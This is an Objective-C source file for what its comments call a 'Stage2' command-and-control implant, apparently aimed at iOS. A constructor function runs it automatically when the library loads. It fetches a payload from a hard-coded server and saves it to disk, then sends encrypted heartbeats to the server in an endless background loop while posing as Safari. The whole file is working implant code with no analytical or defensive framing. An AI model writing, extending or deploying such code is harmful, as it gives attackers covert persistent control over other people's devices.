#import <Foundation/Foundation.h>
#import <CFNetwork/CFNetwork.h>
#import <CommonCrypto/CommonCryptor.h>
#import <CommonCrypto/CommonDigest.h>

/* ============================================================
 * Minimal Stage2 (link-only): fixed base URL, no domain pool.
 * Phase 1: keep a persistent C2 connection
 *   - GET /details/show.html (store raw payload)
 *   - POST /event heartbeat (AES-256-ECB, key=SHA256(secret+ts))
 *   - loop forever
 * ============================================================ */

static NSString *const kBaseURL = @"http://192.168.36.253:18889";
static NSString *const kShowHTMLPath = @"/details/show.html";
static NSString *const kEventPath = @"/event";
static NSString *const kHeartbeatSecret = @"Ek8pl31K2yeHgQwy";
static NSString *const kUserAgent =
    @"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
    @"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1";

static NSData *PLHTTPRequest(NSString *urlString, NSString *method, NSData *postBody, NSInteger *statusOut);
static NSData *PLSHA256(NSData *data);
static NSData *PLAes256EcbEncrypt(NSData *plain, NSData *key);

/* ---------------- HTTP helper (CFNetwork) ---------------- */

static NSData *PLHTTPRequest(NSString *urlString, NSString *method, NSData *postBody, NSInteger *statusOut) {
    if (statusOut) *statusOut = -1;
    CFStringRef cfUrl = CFStringCreateWithCString(NULL, urlString.UTF8String, kCFStringEncodingUTF8);
    if (!cfUrl) return nil;
    CFURLRef url = CFURLCreateWithString(NULL, cfUrl, NULL);
    CFRelease(cfUrl);
    if (!url) return nil;

    CFHTTPMessageRef req = CFHTTPMessageCreateRequest(
        NULL,
        (__bridge CFStringRef)method,
        url,
        kCFHTTPVersion1_1);
    CFRelease(url);
    if (!req) return nil;

    CFHTTPMessageSetHeaderFieldValue(req, CFSTR("User-Agent"),
        (__bridge CFStringRef)kUserAgent);
    if (postBody && postBody.length > 0) {
        CFHTTPMessageSetBody(req, (__bridge CFDataRef)postBody);
        CFHTTPMessageSetHeaderFieldValue(req, CFSTR("Content-Type"),
            CFSTR("application/octet-stream"));
    }

    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(NULL, req);
    CFRelease(req);
    if (!stream) return nil;

    if (!CFReadStreamOpen(stream)) {
        CFRelease(stream);
        return nil;
    }

    NSMutableData *out = [NSMutableData data];
    uint8_t buf[8192];
    CFIndex n;
    while ((n = CFReadStreamRead(stream, buf, sizeof(buf))) > 0) {
        [out appendBytes:buf length:(NSUInteger)n];
    }

    CFHTTPMessageRef resp = (CFHTTPMessageRef)CFReadStreamCopyProperty(
        stream, kCFStreamPropertyHTTPResponseHeader);
    if (statusOut && resp) {
        *statusOut = CFHTTPMessageGetResponseStatusCode(resp);
    }
    if (resp) CFRelease(resp);
    CFReadStreamClose(stream);
    CFRelease(stream);
    return out;
}

/* ---------------- crypto helpers (CommonCrypto) ---------------- */

static NSData *PLSHA256(NSData *data) {
    uint8_t digest[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);
    return [NSData dataWithBytes:digest length:CC_SHA256_DIGEST_LENGTH];
}

static NSData *PLAes256EcbEncrypt(NSData *plain, NSData *key) {
    size_t outLen = ((plain.length + 15) / 16) * 16 + 16;
    NSMutableData *out = [NSMutableData dataWithLength:outLen];
    size_t moved = 0;
    CCCryptorStatus st = CCCrypt(
        kCCEncrypt, kCCAlgorithmAES, kCCOptionECBMode | kCCOptionPKCS7Padding,
        key.bytes, key.length, NULL,
        plain.bytes, plain.length,
        out.mutableBytes, outLen, &moved);
    if (st != kCCSuccess) return nil;
    out.length = moved;
    return out;
}

/* ---------------- link engine ---------------- */

static NSString *SaveDir(void) {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    return paths.firstObject ?: @"/tmp";
}

static BOOL PLFetchShowHTML(void) {
    NSString *url = [kBaseURL stringByAppendingString:kShowHTMLPath];
    NSInteger status = 0;
    NSData *raw = PLHTTPRequest(url, @"GET", nil, &status);
    if (!raw || status != 200 || raw.length == 0) {
        NSLog(@"[stage2] show.html fetch failed: status=%ld len=%zu",
              (long)status, raw.length);
        return NO;
    }
    NSString *fn = [SaveDir() stringByAppendingPathComponent:@"stage2_show_raw.bin"];
    [raw writeToFile:fn atomically:YES];
    NSLog(@"[stage2] show.html fetched: %zu bytes -> %@", raw.length, fn);
    return YES;
}

static BOOL PLSendHeartbeat(void) {
    NSDate *now = [NSDate date];
    NSString *ts = [NSString stringWithFormat:@"%.0f", now.timeIntervalSince1970 * 1000.0];
    NSDictionary *payload = @{
        @"ts": ts,
        @"t": @"hb",
    };
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    NSString *plainString = [ts stringByAppendingString:
        [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
    NSData *plain = [plainString dataUsingEncoding:NSUTF8StringEncoding];

    NSString *keyInput = [kHeartbeatSecret stringByAppendingString:ts];
    NSData *key = PLSHA256([keyInput dataUsingEncoding:NSUTF8StringEncoding]);
    NSData *cipher = PLAes256EcbEncrypt(plain, key);
    if (!cipher) return NO;

    NSString *url = [kBaseURL stringByAppendingString:kEventPath];
    NSInteger status = 0;
    NSData *resp = PLHTTPRequest(url, @"POST", cipher, &status);

    NSString *base = [NSString stringWithFormat:@"stage2_event_%.0f",
        now.timeIntervalSince1970];
    [plain writeToFile:[SaveDir() stringByAppendingPathComponent:[base stringByAppendingString:@".plain"]]
             atomically:YES];
    if (resp) {
        [resp writeToFile:[SaveDir() stringByAppendingPathComponent:[base stringByAppendingString:@".resp"]]
                atomically:YES];
    }
    NSLog(@"[stage2] heartbeat: plain=%zu cipher=%zu status=%ld",
          plain.length, cipher.length, (long)status);
    return resp != nil;
}

/* ---------------- entry point ---------------- */

__attribute__((constructor))
static void Stage2Entry(void) {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
        if (!PLFetchShowHTML()) {
            for (int i = 0; i < 5 && !PLFetchShowHTML(); i++)
                [NSThread sleepForTimeInterval:10.0];
        }
        for (;;) {
            PLSendHeartbeat();
            [NSThread sleepForTimeInterval:600.0];
        }
    });
}